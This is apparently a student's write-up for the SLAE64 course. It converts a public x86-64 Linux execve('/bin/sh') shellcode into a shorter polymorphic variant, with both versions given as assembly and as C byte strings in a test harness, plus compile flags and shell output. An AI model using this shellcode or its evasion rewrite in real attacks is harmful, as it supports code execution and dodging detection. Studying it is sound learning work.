---
title: SLAE64 Assignment 6 - Polymorphic Execve
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the sixth assignment of the SLAE64, I created three polymorphic payloads from shellcodes on shellstorm and the exploit db. This is the first payload, execve.

This polymorphic version is 5 bytes shorter than the original, and maintains the same functionality.

# Original Shellcode
http://shell-storm.org/shellcode/files/shellcode-76.php
```nasm
# [Linux/X86-64]
# Dummy for shellcode:
# execve("/bin/sh", ["/bin/sh"], NULL)
# hophet [at] gmail.com
.text
    .globl _start
_start:
    xorq    %rdx, %rdx
    movq    $0x68732f6e69622fff,%rbx
    shr $0x8, %rbx
    push    %rbx
    movq    %rsp,%rdi
    xorq    %rax,%rax
    pushq   %rax
    pushq   %rdi
    movq    %rsp,%rsi
    mov $0x3b,%al   # execve(3b)
    syscall
    pushq   $0x1
    pop %rdi
    pushq   $0x3c       # exit(3c)
    pop %rax
    syscall
```
+ As we can see above, this is AT&T assembly syntax.

## Intel Assembly Version of the Shellcode

```nasm 
; [Linux/X86-64]
; Dummy for shellcode:
; execve("/bin/sh", ["/bin/sh"], NULL)
; hophet [at] gmail.com
_start:
    xor    rdx, rdx
    mov    rbx, 0x68732f6e69622fff
    shr rbx, 0x8
    push    rbx
    mov    rdi, rsp
    xor    rax, rax
    push   rax
    push   rdi
    mov    rsi, rsp
    mov al, 0x3b   ; execve(3b)
    syscall
    push  0x1
    pop rdi
    push  0x3c     ; exit(3c)
    pop rax
    syscall
```
+ Much better now without all those percentage and dollar signs.

## Compiling the Shellcode
```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53"
"\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f"
"\x6a\x3c\x58\x0f\x05";
int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

## Testing the Shellcode
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# ./shellcode
Shellcode Length:  41
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Polymorphic Version
```nasm
_start:
xor rsi, rsi ; rsi = 0x0
mul rsi      ; rax & rdx = 0x0
mov rcx, 0x68732f6e69622fff ; /bin/sh,0xff
shr rcx, 0x8
push rcx
mov rdi, rsp
mov al, 0x3b        ; execve system call
syscall

push 0x1
pop rdi
push 0x3c            ; exit(3c)
pop rax
syscall
```
+ I used the `mul rsi` technique to clear `rdx` & `rax`.
+ No need for the pointer to a pointer in `rsi` so I got rid of it.
+ I changed `rbx` to `rcx`.

### Polymorphic Version in Host Program
```c
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x48\x31\xf6\x48\xf7\xe6\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68\x48\xc1\xe9\x08\x51\x48\x89\xe7\xb0\x3b\x0f\x05\x6a\x01"
"\x5f\x6a\x3c\x58\x0f\x05";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

### Compile and Test
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode-poly.c -o shellcode-poly
root# ./shellcode-poly
Shellcode Length:  36
# id
uid=0(root) gid=0(root) groups=0(root)
```
+ Awesome! The shellcode is shorter and works as intended!
